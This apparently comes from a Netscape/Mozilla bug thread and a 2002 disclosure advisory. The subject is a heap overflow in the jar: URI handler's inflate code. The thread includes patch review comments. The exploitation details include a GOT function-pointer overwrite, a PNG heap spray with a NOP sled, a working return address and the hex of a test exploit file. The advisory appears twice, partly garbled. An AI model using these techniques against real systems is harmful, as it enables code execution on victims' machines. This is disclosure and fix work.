$ cp new.jar ~/public\_html
(This file only contains the 2 0x18s (24s)
representing the realsize, so
it works ok on this file. Actual explot uses
a hex editor.)
In Netscape open:
jar:[http://host/~username/new.jar!/test.gif](http://host/~username/new.jar%21/test.gif)
The jr file is retrieved, the requested file
is found...
...
584 //-- Read the item into memory
585 // Inflate if necessary and save in
mInflatedFileBuffer
586 // for sequential reading.
587 // (nsJAR needs the whole file in
memory before passing it on)
588 char\* buf =
(char\*)PR\_Malloc(item->realsize);
589 if (!buf) return ZIP\_ERR\_MEMORY;
590 switch(item->compression)
591 {
592 case DEFLATED:
593 result = InflateItem(item, 0, buf);
594 break;...
A buffer is allocated for storing the data.
The realsize value is used for
the length. (Size 1 actually allocates 8
bytes, hence the padding.)
The buf is the passed to the inflater.
...
1268 PRInt32 nsZipArchive::InflateItem( const
nsZipItem\* aItem, PRFileDesc\* fOut,
1269 char\*
bigBuf )
...
as bigBuf. Some temporary storage is made,
and a chunk of decompression done.
...
1382 {
1383 //-- copy inflated buffer to our
big buffer
1384 // Assertion makes sure we don't
overflow bigBuf
1385 PR\_ASSERT( outpos + ZIP\_BUFLEN
<= bigBufSize);
1386 char\* copyStart = bigBuf +
outpos;
1387 memcpy(copyStart, outbuf,
ZIP\_BUFLEN);
1388 }
...
The assertion doesn't fire. It should
probably be made into a normal check as
well.
We now have a heap based buffer overflow.
At some point in the future, chunk\_free() is
called, and a SEGV will occur
with while referencing the values 0xdeadbeef
and 0xfee1600d.
If these are replaced with (address of a
function pointer)-12 and (address
of user supplied code), when the function
pointer is called, the user
supplied code will execute.
I have successfully changed the flow of
control in tests, by overwriting
the function pointer for PR\_Free in the
global offset table of libsnpr4.so.
"Shellcode" can be supplied in a previously
loaded image. (A large area
can be filled using compressed image files
stored in a .jar as the source.)

Simple patch for this overflow.
Adds test that mirrors the assert.

nit: how about moving the PR\_ASSERT into the |else| block. PR\_NOT\_REACHED
is probably more appropriate since it avoids duplicating the expression.
> PR\_ASSERT( (outpos + chunk) <= bigBufSize );
>+ if ( outpos + ZIP\_BUFLEN <= bigBufSize )
these two lines don't match! shouldn't |ZIP\_BUFLEN| be |chunk| instead?

Mitch is still looking for a demonstrable exploit. I could crash, but not with
the supplied addresses, and it hasn't been shown that an attacker could predict
the address of any attack code that could be loaded as an image.

With regard to exploitablity:
Same method for predicted return address as the PNG exploits works for NS6.2.3,
which was what this bug was originally reported in.
Make a 12-16meg PNG image, with 1/2 of it a NOP sleep, and the other 1/2 the
pointers to the shellcode. In my example exploit for the other jar bug, I used
0x41ab005e as my return address, which was, under redhat 7.0, allocated for
storing the png image, so I did the same for this one.
7a 65 6e 2d 68 65 72 65 00 00 00 00 00 00 00 00 64 02 1c 40 5e 00 ab 41
That is the hex for contents of the test.gif I successfully used for explotation
on Redhat 7.0, with Netscape 6.2.3.
Under Netscape 7.0 release, the is more difficult, but not impossilbe to
exploit.(Could maybe also create a string of a size that would force it to be
allocated with javascript, of the same length/format the the PNG image
mentioned.) It might also be possible to overwrite some stack address with the
chunk and change the flow of execution with that method, or to change the value
of some address containing a flag that suggests something might be a safe
operation to perform when it is not.
It could still be exploitable by overwriting function pointers with the address
of a call \*eax, or similar, where the register contains the code to execute, or
a pointer to such code.
There are many different ways of exploiting an arbitrary length heap overrun.

The following is the text of an advisory (with a couple of typos fixed)
that was sent to Netscape in early July.
(-rw-r--r--    1 root     root         3210 Jul  8 17:07 jar-writeup)

This was one a several vulnerabilities reported in Netscape/Mozilla over
that period. (Others included the previously posted zero-width gif
problem, and PNG vulnerabilities.)

This page shows that the bug was opened on 2002-07-15 18:54

I think 4 months is definately long enough to wait before disclosure.

=====

Exploitable heap corruption via jar: URI handler.

Create a file, called test.gif with the following 6 'int's in it.

0x2d6e657a,0x65726568,

$ cp new.jar ~/public_html

(This file only contains the 2 0x18s (24s) representing the realsize, so
it works ok on this file. Actual exploit file was created with a hex
editor.)

In Netscape open:

   jar:<http://host/~username/new.jar>!/test.gif

The jar file is retrieved, the requested file is found...
...
584   //-- Read the item into memory
585   //   Inflate if necessary and save in mInflatedFileBuffer
586   //   for sequential reading.
587   //   (nsJAR needs the whole file in memory before passing it on)
588   char* buf = (char*)PR_Malloc(item->realsize);
589   if (!buf) return ZIP_ERR_MEMORY;
590   switch(item->compression)
591   {
592     case DEFLATED:
593       result = InflateItem(item, 0, buf);
594       break;
...
A buffer is allocated for storing the data. The realsize value is used for
the length. (Size 1 actually allocates 8 bytes, hence the padding.)
The buf is the passed to the inflater.
...
1268 PRInt32 nsZipArchive::InflateItem( const nsZipItem* aItem, PRFileDesc* fOut,
1269                                    char* bigBuf )
...
as bigBuf. Some temporary storage is made, and a chunk of decompression done.
...
1382       {
1383         //-- copy inflated buffer to our big buffer
1384         // Assertion makes sure we don't overflow bigBuf
1385         PR_ASSERT( outpos + ZIP_BUFLEN <= bigBufSize);
1386         char* copyStart = bigBuf + outpos;
1387         memcpy(copyStart, outbuf, ZIP_BUFLEN);
1388       }
...
The assertion doesn't fire. It should probably be made into a normal
check as
well.

We now have a heap based buffer overflow.

At some point in the future, chunk_free() is called, and a SEGV will occur
with while referencing the values 0xdeadbeef and 0xfee1600d.

If these are replaced with (address of a function pointer)-12 and (address
of user supplied code), when the function pointer is called, the user
supplied code will execute.

I have successfully changed the flow of control in tests, by overwriting
the function pointer for PR_Free in the global offset table of libsnpr4.so.

"Shellcode" can be supplied in a previously loaded image. (A large area
can be filled using compressed image files stored in a .jar as the source.)
